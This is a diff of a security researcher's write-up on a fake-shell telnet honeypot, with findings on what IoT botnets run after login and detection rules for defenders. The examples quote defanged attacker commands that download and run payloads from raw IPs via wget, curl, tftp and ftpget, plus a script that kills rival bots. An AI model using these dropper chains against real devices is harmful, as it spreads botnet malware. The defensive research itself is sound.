@@ -1,13 +1,13 @@
 # What IoT botnets do after logging in: a telnet honeypot in Rust
 
-[Timothy Fletcher](https://timfletcher.tech) · November 2026 · Data from 2026-11-03 01:29 UTC to 2026-11-06 15:34 UTC (86 hours)
+[Timothy Fletcher](https://timfletcher.tech) · November 2026 · Data from 2026-11-03 01:29 UTC to 2026-11-10 19:45 UTC (186 hours)
 
 ## Summary
 
-- **What I built:** a medium-interaction telnet honeypot in Rust, run on Google Cloud for 86
+- **What I built:** a medium-interaction telnet honeypot in Rust, run on Google Cloud for 186
   hours. 18 common factory-default logins get into a shell that's entirely fake. Every reply is
   fixed text compiled into the program, and nothing a visitor sends is ever run or fetched.
-- **What I found:** 481 of 2,450 connections logged in and sent 1,772 commands, including 13
+- **What I found:** 839 of 5,527 connections logged in and sent 3,784 commands, including 23
   attempts to download and run malware. None of them produced an outbound connection. Most bots
   followed the same playbook, mapped below to MITRE ATT&CK.
 - **What it shows:** a fixed-reply shell is safe but easy to spot. Almost every bot that checked
@@ -17,17 +17,18 @@
 
 | Headline | Value |
 | --- | --- |
-| Time live | 86 hours, one server, port 23 only |
-| Connections | 2,450 from 364 IP addresses |
-| Logins into the fake shell | 481 from 152 IP addresses |
-| Commands | 1,772, of which 74 were different |
-| Download attempts | 13 sessions from 7 IPs, naming 7 different addresses |
-| Already reported to AbuseIPDB | 472 of the 478 IPs seen Nov 2–6, at least 417 of them before they reached the honeypot |
+| Time live | 186 hours, one server, port 23 only |
+| Connections | 5,527 from 790 IP addresses |
+| Logins into the fake shell | 839 from 330 IP addresses |
+| Commands | 3,784, of which 152 were different |
+| Download attempts | 23 sessions from 12 IPs, naming 17 different addresses on 9 servers |
+| Already reported to AbuseIPDB | At least 316 of the 330 IPs that got into the shell (96%), and at least 867 of all 901 seen Nov 2–10 (96%), before they reached the honeypot |
+| Reported to AbuseIPDB by me | 170 IPs, 49 on Nov 8 and 121 on Nov 10. I was the first to report 7 of them in the past year |
 | Outbound connections made by the honeypot | **0** |
 | Crashes, restarts, program errors | 0, 0, 0 |
 | Visits that sent nothing at all | 12%, down from 82% before the telnet opening |
-| Data sent by the server | 0.5 to 1.0 MB a day |
-| Automated tests | 290 passing, 17 of them guarding the safety rules |
+| Data sent by the server | 0.4 to 1.3 MB a day |
+| Automated tests | 293 Rust tests passing, 17 of them guarding the safety rules, and 91 Python tests for the analysis and reporting scripts |
 
 ## Architecture and safety design
 
@@ -63,16 +64,16 @@ Each layer assumes the one above it has failed.
 | Cloud firewall | Only TCP 23 is open to the internet. SSH is reachable only from Google's IAP range, never on the public IP. Egress is denied and logged | The same outbound test with the host firewall off was blocked. From outside, ports 22 and 2323 were closed |
 | Cloud identity | No service account, so the server has no Google Cloud permissions. Serial port off, project-wide SSH keys blocked | Set in Terraform, which has no `service_account` block |
 | Limits | 64 connections, 4 per IP, 60 visits a minute, 30 seconds per visit. Each session is capped at 200 lines, 64 KB stored and 8 KB of replies. The shell has a 20 MB daily budget and logging a 100 MB one | "Refused by the limits" and data sent, in the daily summary |
-| Operations ([deploy/daily-logs.sh](deploy/daily-logs.sh)) | A daily script copies the logs, prints only counts and prints STOP, with the reason, if any rule is broken. The kill switch is deleting one firewall rule | Ran with no STOP on 2026-11-06 |
+| Operations ([deploy/daily-logs.sh](deploy/daily-logs.sh)) | A daily script copies the logs, prints only counts and prints STOP, with the reason, if any rule is broken. The kill switch is deleting one firewall rule | Ran with no STOP, most recently on 2026-11-10 |
 
-**Egress results, Nov 3 to Nov 6:**
+**Egress results, Nov 3 to Nov 10:**
 
 | Check | Result |
 | --- | --- |
-| Outbound attempts by the honeypot user (host firewall log) | 0, despite 88 download addresses (7 unique) sent to it |
+| Outbound attempts by the honeypot user (host firewall log) | 0, despite 154 download addresses (17 unique) sent to it |
 | Other blocked outbound lines | 5, all from the planned admin self-test at launch |
 | Cloud firewall egress log | 0 hits |
-| Data sent per day, by Google's own count | 0.5 to 1.0 MB |
+| Data sent per day, by Google's own count | 0.4 to 1.3 MB |
 
 ## How I built it
 
@@ -84,34 +85,39 @@ server, made each safety and data-handling decision myself, and can explain how 
 
 ## Findings: the post-login playbook
 
-Of 2,450 connections, 2,132 (87%) sent a login, 481 were accepted, 414 of those sessions sent at
-least one command, and 13 (2.7% of sessions) reached a download. Sessions ended in two ways: 289
-hung up and 192 waited until the 30-second limit.
+Of 5,527 connections, 4,805 (87%) sent a login, 839 were accepted, 706 of those sessions sent at
+least one command, and 23 (2.7% of sessions) reached a download. Sessions ended in two ways: 531
+hung up and 308 waited until the 30-second limit.
 
 | Step | What bots sent (masked) | MITRE ATT&CK | Lines | IPs |
 | --- | --- | --- | --- | --- |
-| Log in with factory defaults | Common usernames such as `root`, `admin`, `default`, `support` | T1110.001 Password Guessing, T1078.001 Default Accounts | 2,132 logins | 152 got in |
-| Break out of a router's limited menu | `enable`, `system`, `shell`, `sh`, `linuxshell` | T1059.008 Network Device CLI, T1059.004 Unix Shell | 1,082 | 92 |
-| Try a router CLI | `config terminal`, `start`, `su` | T1059.008 Network Device CLI | 240 | 25 |
-| Inject a shell into a ping tool | `ping ;sh`, also sent as `ping; sh` and `ping;sh` | T1059.004 Unix Shell | 64 | 48 |
-| Look around | `uname -m`, `cat /proc`, `cat /etc/passwd`, `id`, `ls /home` | T1082, T1087.001, T1033, T1083 | 177 | 50 |
-| Find a writable folder, then check with a hex `echo` | `>/var/run/.x&&cd /var/run;…` (below) | T1083 File and Directory Discovery | 80 | 25 |
-| Check for a real BusyBox | `/bin/busybox SORA` | T1497.001 System Checks (closest fit) | 29 | 11 |
-| Check that `echo` works | Hex `echo -e` markers, `echo PAYLOAD_WORKING` | T1497.001 System Checks (closest fit) | 13 | 9 |
-| The `SHELL_TEST` check | `echo SHELL_TEST`, then hang up | T1497.001 System Checks (closest fit) | 47 | 3 |
-| Download and run | `wget`, `curl` and `tftp` fallbacks, `chmod 777`, run in the background | T1105 Ingress Tool Transfer, T1222.002, T1059.004 | 13 | 7 |
-| Remove rival bots | `killall -9` a list of other botnets' names | T1489 Service Stop (closest fit) | 1 | 1 |
-| Clean up | Delete the script after running it | T1070.004 File Deletion | 1 | 1 |
+| Log in with factory defaults | Common usernames such as `root`, `admin`, `default`, `support` | T1110.001 Password Guessing, T1078.001 Default Accounts | 4,805 logins | 330 got in |
+| Break out of a router's limited menu | `enable`, `system`, `shell`, `sh`, `linuxshell`, sometimes ending in a NUL byte | T1059.008 Network Device CLI, T1059.004 Unix Shell | 2,349 | 211 |
+| Try a router CLI | `config terminal`, `start`, `su` | T1059.008 Network Device CLI | 588 | 58 |
+| Inject a shell into a ping tool | `ping ;sh`, also sent as `ping; sh` and `ping;sh` | T1059.004 Unix Shell | 137 | 117 |
+| Look around | `uname -m`, `cat /proc`, `cat /etc/passwd`, `id`, `ls /home` | T1082, T1087.001, T1033, T1083 | 257 | 117 |
+| Find a writable folder, then check with a hex `echo` | `>/var/run/.x&&cd /var/run;…`, `>/tmp/.ptmx && cd /tmp/` (below) | T1083 File and Directory Discovery | 221 | 60 |
+| Check for a real BusyBox | `/bin/busybox SORA`, or a random word | T1497.001 System Checks (closest fit) | 73 | 24 |
+| Check that `echo` works | Hex `echo -e` markers, `echo PAYLOAD_WORKING` | T1497.001 System Checks (closest fit) | 16 | 12 |
+| The `SHELL_TEST` check | `echo SHELL_TEST`, then hang up | T1497.001 System Checks (closest fit) | 58 | 3 |
+| Download and run | `wget`, `curl`, `tftp` and `ftpget` fallbacks, `chmod 777`, run in the background | T1105 Ingress Tool Transfer, T1222.002, T1059.004 | 23 | 12 |
+| Remove rival bots | `killall -9` a list of other botnets' names, or a script that kills them | T1489 Service Stop (closest fit) | 2 | 2 |
+| Clean up | Delete the script after running it | T1070.004 File Deletion | 6 | 5 |
 
 Examples, masked and defanged. IPs keep only their first two numbers, and IDs or file names that
 could identify this honeypot are replaced with `<id>` and `<name>`. Long lines are shortened with
 `…`.
 
 ```text
-# The writable-folder probe. The 6-letter marker is random, with 25 variants seen
+# The writable-folder probe. The 6-letter marker is random, with 60 variants seen
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;…;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x48\x47\x4a\x4e\x4e\x4f'
 
-# BusyBox checks with a made-up "applet", often a botnet's name: SORA, YAKUZA, KYTON, V3G4, Cult, UNSTABLE, HISILICON, BOTNET
+# Plainer forms from Nov 10, one folder per line, without the marker
+>/tmp/.ptmx && cd /tmp/
+/bin/busybox echo > /tmp/0 && sh /tmp/0 && cd /tmp/
+
+# BusyBox checks with a made-up "applet", often a botnet's name: SORA, YAKUZA, KYTON, V3G4, Cult, UNSTABLE, HISILICON, BOTNET.
+# From Nov 9, some bots sent a random eight-character word of mixed case and digits instead
 /bin/busybox SORA
 
 # Hex echo markers. These two decode to auth_ok and redtail_bot_telnet_ok
@@ -126,62 +132,127 @@ cd /tmp || cd /var || cd /dev/shm || cd /mnt; (wget -q -O main_arm7 hxxp://201[.
 
 # Kill rival bots, delete other programs from temporary folders, then fetch, run and delete a script
 busybox sh -c 'for p in mirai sora mozi hajime tsunami gafgyt yakuza owari josho ECCHI; do killall -9 $p 2>/dev/null; done; … wget -q -O <name>.sh hxxp://168[.]220[.]x[.]x:9087/payload/<id>/<name>.sh … sh <name>.sh; rm -f <name>.sh'
+
+# From Nov 8: nine fallbacks, ending with BusyBox's FTP client, then run the script and delete it
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;wget hxxp://37[.]221[.]x[.]x/all.sh || curl -O hxxp://37[.]221[.]x[.]x/all.sh || busybox wget hxxp://37[.]221[.]x[.]x/all.sh || busybox tftp 37[.]221[.]x[.]x -c get all.sh || … || busybox ftpget -v -u anonymous -p anonymous -P 21 37[.]221[.]x[.]x all.sh all.sh || … ;chmod 777 all.sh;sh ./all.sh;rm -rf all.sh
+
+# Every tool in turn rather than as fallbacks, so all of them run
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; /bin/busybox wget -q -O telnet2.sh hxxp://176[.]65[.]x[.]x/telnet2.sh; busybox wget …; wget …; curl …; busybox curl …; tftp …; tftp …; ftpget -v -u anonymous -p anonymous -P 21 176[.]65[.]x[.]x telnet2.sh telnet2.sh; chmod 777 telnet2.sh; sh telnet2.sh; rm -rf telnet2.sh
+```
+
+All 17 download addresses named a raw IP, on 9 servers. 6 were a server named on its own, for
+TFTP or FTP. These are the 11 URLs, with the day each was first seen:
+
+```text
+hxxp://160[.]119[.]x[.]x/bins/kla.sh                     Nov 3
+hxxps://217[.]60[.]x[.]x/sh                              Nov 4
+hxxp://168[.]220[.]x[.]x:9087/payload/<id>/<name>.sh     Nov 6
+hxxp://201[.]79[.]x[.]x:8081/main_arm7                   Nov 6
+hxxp://201[.]79[.]x[.]x:8081/main_mips                   Nov 6
+hxxp://201[.]79[.]x[.]x:8081/main_mpsl                   Nov 6
+hxxp://176[.]65[.]x[.]x/telnet2.sh                       Nov 8
+hxxp://160[.]187[.]x[.]x/all.sh                          Nov 9
+hxxp://37[.]221[.]x[.]x/all.sh                           Nov 9
+hxxp://102[.]220[.]x[.]x/curl.sh                         Nov 10
+hxxp://102[.]220[.]x[.]x/wget.sh                         Nov 10
 ```
 
 **What stands out**
 
-- **Most bots check before they commit, and a fixed-reply shell fails the check.** 165 of the 414
+- **Most bots check before they commit, and a fixed-reply shell fails the check.** 339 of the 706
   sessions with commands ran a check that only a real shell passes, because it needs the bot's own
   word repeated back. The honeypot never repeats input, by design: `echo` gets a blank line, and
   `/bin/busybox SORA` gets `busybox: applet not found` where a real device would say
-  `SORA: applet not found`. 161 of those 165 sessions ended on a check without trying a
+  `SORA: applet not found`. 335 of those 339 sessions ended on a check without trying a
   download. Only 4 went on to download anyway.
 - **The playbook is old and stable.** Mirai's leaked source sends `enable`, `system`, `shell` and
   `sh` after logging in, then `/bin/busybox <WORD>`
   ([source code review](https://medium.com/@cjbarker/mirai-ddos-source-code-review-57269c4a68f)).
   Variants keep the same strings with their own word: a string table extracted by
   [miraicfg](https://github.com/FernandoDoming/miraicfg) holds `/bin/busybox JOSHO` and the reply
-  it waits for, `JOSHO: applet not found`. Here, 54 sessions opened with exactly `enable`,
+  it waits for, `JOSHO: applet not found`. Here, 124 sessions opened with exactly `enable`,
   `system`, `shell`, `sh`, then `linuxshell`. The family names in this data come only from the
   bots' own strings. No samples were fetched, so the families aren't confirmed.
+- **Later bots changed their words, not their steps.** From Nov 9, 12 sessions from 5 IPs ran the
+  BusyBox check with a random eight-character word of mixed case and digits instead of a name,
+  each after `enable`, `system`, `shell`, `sh`. A second bot that ends its menu words in a NUL byte
+  appeared on Nov 10: 35 sessions from one IP never seen before, each held for the full 30
+  seconds, next to the first one's 122 sessions from Nov 3 to Nov 6.
 - **Bots compete for devices.** One dropper tries to kill ten rival botnets by name and deletes
-  other programs from the temporary folders before installing its own.
-- **Droppers plan for failure.** Every one had a chain of fallbacks, such as `wget`, then
-  `curl`, then `tftp`. Two passed `telnet` to their payload, most likely to record how they got
-  in.
-- **An open question.** 47 sessions from 3 IPs, all on Nov 3 and 4, logged in, sent only
+  other programs from the temporary folders before installing its own. Another bot wrote a script
+  in 3 hex-escaped `echo` lines that kills any process named after 20 other botnets or 6 CPU
+  builds, or whose program was deleted or hidden, then ran it 10 times. Decoded, it holds no
+  address:
+
+  ```sh
+  #!/bin/sh
+
+  for pid in /proc/[0-9]*; do
+      [ "$pid" = "/proc/1" ] && continue
+      [ "$pid" = "/proc/2" ] && continue
+      case "$(ls -l $pid/exe || readlink $pid/exe || busybox readlink $pid/exe)" in
+          *"(deleted)"*|*"/."*|*mirai*|*mozi*|*hajime*|*sora*|*reaper*|*gafgyt*|*bashlite*|*muhstik*|*selfrep*|*loligang*|*yakuza*|*qbot*|*zbot*|*tokyyo*|*kotori*|*owari*|*demon*|*vpnfilter*|*dvrHelper*|*dvrLocker*|*arm*|*mips*|*mpsl*|*mipsel*|*aarch64*|*x86*) kill -9 ${pid##*/} ;;
+      esac
+  done
+  ```
+- **Droppers plan for failure.** Every one tried several download tools. 19 of the 23 chained
+  them with `||`, such as `wget`, then `curl`, then `tftp`, so each ran only if the one before
+  failed, and the other 4 ran every tool in turn. From Nov 8, 6 of them, from 5 IPs, also fell back
+  on BusyBox's FTP client, `ftpget`, which none had used before. Two passed `telnet` to their
+  payload, most likely to record how they got in.
+- **An open question.** 58 sessions from 3 IPs, on Nov 3, 4 and 8, logged in, sent only
   `echo SHELL_TEST`, received a blank line and hung up. The likeliest explanation is that they
   wanted the word back, but a bot that only checks logins and reports them elsewhere would look the
   same. A fixed reply for that one command is written and tested, but not yet deployed.
 
 ## Threat intel: were these IPs already known?
 
-On Nov 7 I checked every IP that visited between Nov 2, when the fake login went live, and Nov 6
-(478 in all, so the 364 above plus the day before the shell) against AbuseIPDB's check API, asking
-for a year of reports. Only the IP addresses were sent, with nothing from the logs, and nothing was
-reported. [analysis/threat_intel_lookup.py](analysis/threat_intel_lookup.py) does the lookups.
+On Nov 10 and Nov 11 I checked every IP that visited between Nov 2, when the fake login went live,
+and Nov 10 (901 in all, so the 790 above plus those seen only on the day before the shell) against
+AbuseIPDB's check API, asking for a year of reports. Only the IP addresses were sent, with nothing
+from the logs. [analysis/threat_intel_lookup.py](analysis/threat_intel_lookup.py) does the lookups.
 
-- **Almost all were already reported.** 472 of the 478 (99%) had reports from the past year, and
-  at least 417 (87%) had been reported before the honeypot first saw them, a median of at least 22
-  days earlier. The other 6 had no reports in the past year.
-- **New attackers were reported fast.** 3 of the 7 IPs that tried a download had no reports when
-  the honeypot first saw them. Within three days of their first report, they had 1,055 to 5,343
-  each.
-- **Widespread campaigns were known in advance; persistent bots weren't.** Grouping sessions by the
-  exact commands they sent, the three campaigns spread over many IPs came almost entirely from IPs
-  reported before they arrived: the router-CLI and writable-folder probe (25 of 25 IPs), the
-  `enable` … `ping ;sh` opening (36 of 38) and the `HISILICON` BusyBox check (5 of 5). The bots
-  that came back dozens of times from one to three IPs were all new: `uname -m` then `cat /proc`
-  (3 IPs), `echo SHELL_TEST` (3 IPs) and NUL-ended menu words (1 IP). None of those 7 IPs had a
-  report before the honeypot saw them.
-- **Most were on ordinary connections.** 357 of the 478 were on networks AbuseIPDB classes as
+- **Almost all were already reported.** Of the 330 IPs that got into the fake shell, 328 (99%) had
+  reports from the past year. At least 316 (96%) had been reported before the honeypot first saw
+  them, and as many as 319 (97%) may have been, as the note below explains. All 901 visitors give
+  the same shares: 891 (99%) had reports from the past year, and at least 867 (96%) and as many as
+  871 (97%) had been reported before. For the 750 whose earlier reports AbuseIPDB lists, the
+  earliest came a median of at least 28 days before. 10 of the 901 had no reports in the past year.
+  At least 48 of the 901 were research scanners such as Censys, Shadowserver and Shodan, matched the
+  way [analysis/abuse_review.py](analysis/abuse_review.py) skips them when reporting: none got into
+  the shell, all had been reported before, and leaving them out moves none of these shares by as
+  much as a point.
+- **The download IPs had all been reported before.** All 12 IPs that tried a download had been
+  reported before they arrived. For 5 of them only the second check in the note below could show it,
+  because all 100 of their listed reports came after the honeypot saw them.
+- **Widespread campaigns and persistent bots.** Grouping sessions by the exact commands they sent,
+  the three campaigns spread over many IPs: the router-CLI and writable-folder probe (58 of 58 IPs
+  reported before they arrived), the `enable` … `ping ;sh` opening (97 of 100) and the `HISILICON`
+  BusyBox check (8 of 8). The bots that came back dozens of times from one to three IPs: `uname -m`
+  then `cat /proc` (3 IPs), `echo SHELL_TEST` (3 IPs) and the two NUL-word bots (1 IP each). 7 of
+  those 8 IPs score 100 now and the eighth scores 65. 6 had been reported before the honeypot saw
+  them, 5 of them shown only by the second check, and for the other 2 it can't be told.
+- **Most were on ordinary connections.** 696 of the 901 were on networks AbuseIPDB classes as
   fixed-line ISPs, the kind that sell home and office broadband, rather than hosting.
+- **Most of my reports weren't the first.** Of the 170 IPs I reported, someone else had reported
+  162 first: 158 shown by the reports AbuseIPDB lists, and 4 more by a second check like the one in
+  the note below, counting from a day or more before my report. I was the first in the past year
+  for 7, all reported on Nov 10. For the last one, mine wasn't among the newest 100 reports that
+  AbuseIPDB lists, and the second check counted more reports than the first lookup had, because
+  more came in between, so it can't be told.
 
-AbuseIPDB returns only the past year of reports, so "before" means within that year, and scores
-are as of Nov 7, after these IPs had visited. It also lists at most 10,000 reports per IP. 20 IPs
-had more, and 11 of those had no listed report from before the honeypot saw them, so they may have
-been reported earlier too. That's why the 417 and the 22 days are lower bounds. None of the IPs
-named in the campaigns above, or that tried a download, had more than 10,000 reports.
+AbuseIPDB returns only the past year of reports, so "before" means within that year, and scores are
+as of Nov 10 and Nov 11, after these IPs had visited and after my own reports of 170 of them. It
+also lists only the newest 100 reports for each IP: its docs say up to 10,000, but no lookup here
+listed more than 100. 397 IPs had more, so their oldest reports weren't listed, which is why the 28
+days is a lower bound. For 121 of those, all 100 listed reports came after the honeypot saw them.
+For each of these I made a second check, asking only how many reports had come in since a day or
+more before the honeypot first saw the IP. Where the year check had counted more, the rest were
+older: that showed 117 had been reported before. The two counts weren't taken at the same time: the
+year checks on Nov 10 and Nov 11, the second checks on Nov 11 and Nov 13. Reports that came in
+between count only in the second, so the gap can hide older reports but never add any. For each of
+the other 4, the second check counted more reports than the year check had, so it can't be told,
+which is the gap between 867 and 871 above.
 
 ## What defenders should do
 
@@ -190,19 +261,29 @@ Every step of the playbook above depends on something a network owner controls.
 1. **Block inbound telnet (23 and 2323) at the edge.** 87% of connections here sent a login,
    and an open telnet port was all any of these bots needed to start.
 2. **Change factory-default logins before a device is deployed.** 18 common defaults were enough
-   for 481 logins from 152 IPs in 86 hours.
+   for 839 logins from 330 IPs in 186 hours.
 3. **Put IoT devices on their own network segment, with outbound traffic restricted to what they
    need.** Every dropper here had to fetch its payload from a raw IP address, over ports 80, 443,
-   8081 and 9087 or over TFTP. An outbound allow-list would have stopped every download in this
+   8081 and 9087 or over TFTP or FTP. An outbound allow-list would have stopped every download in this
    data, as this honeypot's own firewalls did.
 4. **Alert on new outbound connections from IoT devices.** These devices talk to a small, fixed
    set of servers, so a connection to an unfamiliar address is worth a look, especially within
    minutes of an inbound login. Detection 3 below does this from firewall logs.
-5. **Use IP reputation blocklists, but as one layer, not the defence.** By Nov 7, 301 of the 478
-   IPs (63%) scored 75 or above. On the day they arrived, fewer would have: at least 23 of those
-   301 had no reports until after they reached the honeypot. They include all 7 IPs behind the
-   persistent bots, which score 100 now. A blocklist only
-   knows yesterday's attackers, so it adds to steps 1 to 4 rather than replacing them.
+5. **Use IP reputation blocklists, but as one layer, not the defence.** At least 316 of the 330 IPs
+   that got into the shell (96%) had been reported to AbuseIPDB before they reached the honeypot,
+   so a reputation blocklist would likely have flagged most of them. A past report isn't the same
+   as a high score on the day, though: the lookups give only each IP's score when it was checked,
+   so what these IPs scored when they arrived can't be seen. By Nov 11, 551 of the 901 IPs (61%)
+   scored 75 or above, and at least 2 of those, and as many as 6, had no reports until after they
+   reached the honeypot. A blocklist only knows yesterday's attackers, so it adds to steps 1 to 4
+   rather than replacing them.
+
+**The detections were updated as the bots changed.** Detection 1 now looks for an upper-case
+letter anywhere in BusyBox's applet word, so a random word that starts in lower case is caught.
+Detection 2 now covers `ftpget` and a script piped from `-O-` at the end of a line. Detection 3
+already covered FTP, because it flags any new outbound connection except DNS and NTP.
+[analysis/test_detections.py](analysis/test_detections.py) tests detections 1 and 2 as published
+against the real command lines, masked.
 
 The follow-up project, [playbook-defense](https://github.com/NotKornFlakes/playbook-defense),
 turns these findings into alerts, a firewall allowlist and an internal decoy.
@@ -227,7 +308,8 @@ release starts every connection with the negotiation a small device would send.
 | IPs showing the silent retry rhythm | 11 | 0 on every day |
 | The 7 IPs seen in both periods | 44 of 109 visits silent (40%) | 35 of 434 visits silent (8%) |
 
-Silent visits stayed between 8% and 13% on each calendar day.
+Silent visits stayed between 8% and 13% on each calendar day. Through Nov 10, they stayed between
+8% and 14% each day.
 
 **The caveat.** Turning on the shell meant reinstalling the server, but it kept the same public IP
 address. The rebuilt server briefly had another address, and its restart before the port reopened
@@ -236,7 +318,7 @@ First, the visitors changed: only 7 of the 117 IPs from the day before were seen
 went from 40% silent to 8%, which points the same way, but 7 is too few to carry the claim. Second,
 the baseline is a single day. The 11 retry IPs never came back, even though the address was the
 same, so the hypothesis about those bots specifically is untested. What the data supports: silent
-visits fell sharply after the change and stayed low for four days. The opening is the likeliest
+visits fell sharply after the change and stayed low through Nov 10. The opening is the likeliest
 cause, but this setup can't rule out a change in who was visiting.
 
 ## Detection ideas
@@ -247,8 +329,8 @@ that log process starts (auditd or eBPF), while the KQL query works from firewal
 see IoT devices.
 
 **1. BusyBox started with a made-up applet name (Sigma).** Real applet names are lower case.
-Bots use an upper-case word to test for a real BusyBox. Later bots used a random word of mixed
-case instead, so the rule looks for an upper-case letter anywhere in the word (see the update).
+Bots use an upper-case word, or a random word of mixed case, to test for a real BusyBox, so the
+rule looks for an upper-case letter anywhere in the word.
 
 ```yaml
 title: BusyBox Started With a Word Holding an Upper-Case Letter Instead of an Applet
@@ -280,9 +362,11 @@ level: high
 ```
 
 **2. A download tool fetches a CPU-named binary or a piped script from a bare IP, or uses FTP
-(Sigma).** All 7 download addresses in the data used a raw IP. Most named the file after a CPU
-type, sat under `/bins/`, or were piped straight into `sh`. Later droppers also fell back on
-BusyBox's `ftpget`, which the rule now covers (see the update).
+(Sigma).** All 17 download addresses in the data used a raw IP. 7 of the 11 URLs named the file
+after a CPU type, sat under `/bins/`, or were piped straight into `sh`, and 6 droppers also fell
+back on BusyBox's `ftpget`. A known gap remains: a script with a generic name such as `all.sh`,
+saved to a file, isn't caught, because matching any script fetched from a bare IP would also flag
+internal installers.
 
 ```yaml
 title: Download Tool Fetches a CPU-Named Binary or Piped Script, or Uses FTP, From a Bare IP Address
@@ -354,7 +438,7 @@ telnet_in
 
 ## Limits
 
-- **Short and narrow.** 86 hours, one IP address in one cloud region, telnet only. Cloud address
+- **Short and narrow.** 186 hours, one IP address in one cloud region, telnet only. Cloud address
   ranges attract their own mix of scanners, so these numbers may not match a home or business
   network.
 - **The fake shell is easy to spot.** That's a deliberate trade for safety, but it means the
@@ -362,7 +446,7 @@ telnet_in
 - **No malware samples.** By design the honeypot never fetches an address, so there are no file
   hashes, and family names rest on the bots' own strings.
 - **Time wasted isn't measured.** Each log line records when a visit started, not when it ended.
-  The 30-second cap gives an upper bound, and 192 sessions ran into it.
+  The 30-second cap gives an upper bound, and 308 sessions ran into it.
 - **The telnet result is confounded** by visitor turnover, as described above, and its baseline is
   one day.
 - **Monitoring is daily, not continuous.** The STOP checks run when the daily script runs. Logs
@@ -380,78 +464,12 @@ telnet_in
 3. Test the telnet opening directly by switching the shell, and with it the opening, off for a day
    and back on, without reinstalling. If silent visits rise while it's off and fall again after,
    the cause is the opening rather than a change in visitors.
-4. Keep collecting until the planned one to two weeks, then report abusive IPs to AbuseIPDB with
-   no log contents, as already decided.
+4. Keep collecting to the planned two weeks, and keep reporting the IPs that get into the shell
+   to AbuseIPDB each day, with no log contents. 170 are reported so far.
 5. Convert the Sigma rules with `sigma-cli` and test all three detections against synthetic
    events, never by running a logged command.
 6. Carry on with the roadmap: a fake web service with full request logging, then an offline
    report tool for the downloaded logs.
-
-## Update: Nov 7–10
-
-*Added 2026-11-10. Data from right after the study's last visit, 2026-11-06 15:34 UTC, to
-2026-11-10 19:45 UTC (100 hours), so the two leave no gap. Same server with the same settings,
-and the program hasn't restarted since Nov 3. Everything above covers Nov 3–6 only and is
-unchanged, apart from the two detection fixes described below.*
-
-| Headline | Nov 7–10 |
-| --- | --- |
-| Connections | 3,077 from 447 IP addresses |
-| Logins into the fake shell | 358 from 188 IP addresses |
-| Commands | 2,012, of which 107 were different |
-| Download attempts | 10 sessions from 6 IPs, naming 11 different addresses, 10 of them new |
-| Campaigns never seen before | 13 of 24, in 60 sessions from 14 IPs |
-| Outbound connections made by the honeypot | **0** |
-| Reported to AbuseIPDB | 49 IPs on Nov 8 and 121 on Nov 10 |
-
-A campaign is every shell session that sent exactly the same commands, with the probe's random
-tag removed, as in the notebook's section 7. "Never seen before" means in no shell session from
-Nov 3 to Nov 6.
-
-**What was new**
-
-- **Another NUL-word bot.** One IP, never seen before, sent `enable\0`, `system\0`, `shell\0`
-  and sometimes `sh\0` in 35 sessions on Nov 10, and every one was held for the full 30 seconds.
-  That's 3 of the 13 new campaigns. The Nov 3–6 bot came from another IP and sent `linuxshell\0`
-  second.
-- **BusyBox checks with a random word.** 12 sessions from 5 IPs sent `enable`, `system`, `shell`,
-  `sh`, then `/bin/busybox` with a random eight-character mix of letters and digits. From Nov 3
-  to Nov 6, bots used a name such as `SORA` there. In one of those sessions the word starts with
-  a lower-case letter, which the first version of detection 1 missed, because it wanted an
-  upper-case first letter. It now looks for an upper-case letter anywhere in the word.
-- **A new dropper, `telnet2.sh`,** in 3 sessions from 3 IPs on Nov 8 and Nov 10, each sent
-  straight after `enable`, `system`, `shell`, `sh`.
-- **FTP joined the fallbacks.** 6 of the 10 download sessions, from 5 IPs, also tried
-  `busybox ftpget`, which no session sent from Nov 3 to Nov 6. The first version of detection 2
-  missed it, because it didn't look for `ftpget`. It also missed a script written to standard
-  output when `-O-` came last on the line, as one of the new droppers did. Both are fixed.
-  A known gap remains: a script with a generic name such as `all.sh`, saved to a file, isn't
-  caught, because matching any script fetched from a bare IP would also flag internal installers.
-  Detection 3 already covered FTP, because it flags any new outbound connection except DNS and
-  NTP. [analysis/test_detections.py](analysis/test_detections.py) tests detections 1 and 2 as
-  published against the real command lines, masked.
-
-**New download URLs**, masked and defanged, with the day each was first seen. Their 4 servers were
-also named on their own, for TFTP or FTP, and a fifth server, `94[.]154[.]x[.]x`, only that way
-(Nov 10). That makes 10 new addresses on 5 new servers. The 11th address,
-`hxxp://160[.]119[.]x[.]x/bins/kla.sh`, was one of the 7 from Nov 3–6.
-
-```text
-hxxp://176[.]65[.]x[.]x/telnet2.sh   Nov 8
-hxxp://160[.]187[.]x[.]x/all.sh      Nov 9
-hxxp://37[.]221[.]x[.]x/all.sh       Nov 9
-hxxp://102[.]220[.]x[.]x/curl.sh     Nov 10
-hxxp://102[.]220[.]x[.]x/wget.sh     Nov 10
-```
-
-**Outbound: still 0.** For the whole window, the host firewall logged no blocked outbound
-connection, from the honeypot user or anything else, and the cloud firewall's egress log had no
-hits, though bots sent 66 download addresses to the shell.
-
-**AbuseIPDB.** On Nov 8, I reported the 49 IPs that got into the shell in the 24 hours before,
-each with the fixed comment for what it did
-([analysis/report_abuseipdb.py](analysis/report_abuseipdb.py)). On Nov 10, I reported 121 more
-that got in after those reports went out.
 
 *How the examples were prepared: every value in this report is a count or a masked pattern. Raw
 logs are never published, nothing in them is run or opened, and they're deleted after 30 days.*
